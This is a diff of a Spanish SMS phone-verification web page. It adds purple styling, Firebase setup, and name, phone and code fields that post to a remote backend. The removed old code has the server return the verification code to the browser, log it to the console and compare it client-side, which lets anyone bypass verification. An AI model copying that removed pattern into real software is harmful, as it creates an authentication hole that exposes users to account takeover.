@@ -1,69 +1,225 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verificación por SMS</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación por SMS</title>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"></script>
+    <style>
+        :root {
+            --morado-nu: #820ad1;
+            --morado-claro: #9c27b0;
+            --morado-oscuro: #4a148c;
+            --blanco: #ffffff;
+            --gris-claro: #f5f5f5;
+        }
+        
+        body {
+            margin: 0;
+            padding: 15px;
+            background: linear-gradient(135deg, var(--morado-nu), var(--morado-oscuro));
+            min-height: 100vh;
+            font-family: 'Roboto', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .card {
+            background: var(--blanco);
+            border-radius: 12px;
+            padding: 20px;
+            width: 100%;
+            max-width: 350px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        h1 {
+            color: var(--morado-oscuro);
+            text-align: center;
+            margin: 0 0 20px 0;
+            font-size: 22px;
+        }
+        
+        .input-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: var(--morado-oscuro);
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        
+        input:focus {
+            border-color: var(--morado-claro);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(156, 39, 176, 0.2);
+        }
+        
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: var(--morado-nu);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.2s;
+        }
+        
+        button:hover {
+            background-color: var(--morado-oscuro);
+        }
+        
+        button:disabled {
+            background-color: #bdc3c7;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+        
+        .status {
+            padding: 10px;
+            border-radius: 6px;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 13px;
+            background-color: #f0f4ff;
+            color: #1a237e;
+        }
+        
+        .error {
+            background-color: #ffebee;
+            color: #c62828;
+        }
+        
+        .success {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+        }
+    </style>
+<script type="module">
+    // Importar Firebase desde la CDN
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+import { getAuth } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+import { getFirestore } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-analytics.js";
+
+// Configuración de Firebase
+const firebaseConfig = {
+  apiKey: "AIzaSyBbR-O6hqk9gN2ohQuCCmV-vHiaEGhAL8s",
+  authDomain: "construyecercadeti.firebaseapp.com",
+  databaseURL: "https://construyecercadeti-default-rtdb.firebaseio.com",
+  projectId: "construyecercadeti",
+  storageBucket: "construyecercadeti.appspot.com",
+  messagingSenderId: "888808949632",
+  appId: "1:888808949632:web:677961b72573979c1b6365",
+  measurementId: "G-METG6NS3ZC"
+};
+
+// Inicializar Firebase
+const app = initializeApp(firebaseConfig);
+const analytics = getAnalytics(app);
+const auth = getAuth(app);
+const db = getFirestore(app);
+
+export { auth, db };
+
+</script>
+
 </head>
 <body>
-  <h1>Verificación por SMS</h1>
+    <div class="card">
+        <h1>Verificación por SMS</h1>
+        
+        <div class="input-group">
+            <label for="nombre">Nombre completo</label>
+            <input type="text" id="nombre" placeholder="Ej. Juan Pérez">
+        </div>
+        
+        <div class="input-group">
+            <label for="telefono">Teléfono</label>
+            <input type="tel" id="telefono" placeholder="+52 1 2345 6789">
+        </div>
+        
+        <button id="btnEnviarCodigo">Enviar código</button>
+        
+        <div class="input-group">
+            <label for="codigo">Código de verificación</label>
+            <input type="text" id="codigo" placeholder="Ingresa el código de 6 dígitos">
+        </div>
+        
+        <button id="btnVerificar" disabled>Verificar</button>
+        
+        <div id="status" class="status">Ingresa tu número para comenzar</div>
+    </div>
 
-  <!-- Formulario para ingresar el número de teléfono -->
-  <div id="form">
-    <label for="phoneNumber">Número de Teléfono:</label>
-    <input type="text" id="phoneNumber" placeholder="Ej. +521234567890">
-    <button onclick="sendCode()">Enviar Código</button>
-  </div>
+    <script>
+        // Función para enviar el código de verificación
+        function sendCode() {
+            const phoneNumber = document.getElementById('telefono').value;
 
-  <!-- Formulario para ingresar el código -->
-  <div id="verificationForm" style="display:none;">
-    <label for="verificationCode">Código de Verificación:</label>
-    <input type="text" id="verificationCode" placeholder="Ingresa el código">
-    <button onclick="verifyCode()">Verificar Código</button>
-  </div>
+            if (!phoneNumber.match(/^\+\d{11,15}$/)) {
+                alert("Por favor, ingresa un número válido con código de país.");
+                return;
+            }
 
-  <script>
-    let verificationCode = '';
+            fetch('https://mapsapi2.onrender.com/send-verification', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phoneNumber })
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('btnVerificar').disabled = false;
+                document.getElementById('status').innerText = data.message || "Código enviado. Ingresa el código.";
+            })
+            .catch(error => {
+                document.getElementById('status').innerText = "Error al enviar el código.";
+                document.getElementById('status').classList.add('error');
+            });
+        }
 
-    // Función para enviar el código de verificación
-    function sendCode() {
-      const phoneNumber = document.getElementById('phoneNumber').value;
+        // Función para verificar el código ingresado
+        function verifyCode() {
+            const phoneNumber = document.getElementById('telefono').value;
+            const code = document.getElementById('codigo').value;
 
-      // Enviar solicitud al backend para enviar SMS
-      fetch('https://mapsapi2.onrender.com/send-verification', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ phoneNumber })
-      })
-      .then(response => response.json())
-      .then(data => {
-        // Guardar el código de verificación que se envió
-        verificationCode = data.verificationCode;
-        console.log('Código enviado:', verificationCode);
+            fetch('https://mapsapi2.onrender.com/verify-code', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phoneNumber, code })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    document.getElementById('status').innerText = "¡Código verificado correctamente!";
+                    document.getElementById('status').classList.add('success');
+                } else {
+                    document.getElementById('status').innerText = "Código incorrecto. Intenta de nuevo.";
+                    document.getElementById('status').classList.add('error');
+                }
+            });
+        }
 
-        // Mostrar formulario para ingresar el código
-        document.getElementById('form').style.display = 'none';
-        document.getElementById('verificationForm').style.display = 'block';
-      })
-      .catch(error => {
-        console.error('Error al enviar el SMS:', error);
-      });
-    }
-
-    // Función para verificar el código ingresado
-    function verifyCode() {
-      const enteredCode = document.getElementById('verificationCode').value;
-
-      if (enteredCode === verificationCode.toString()) {
-        alert('¡Código verificado correctamente!');
-        // Aquí puedes almacenar datos en Firebase si es necesario
-        // Ejemplo: guardar el número de teléfono en Firebase
-      } else {
-        alert('Código incorrecto. Intenta de nuevo.');
-      }
-    }
-  </script>
+        document.getElementById('btnEnviarCodigo').addEventListener('click', sendCode);
+        document.getElementById('btnVerificar').addEventListener('click', verifyCode);
+    </script>
 </body>
 </html>
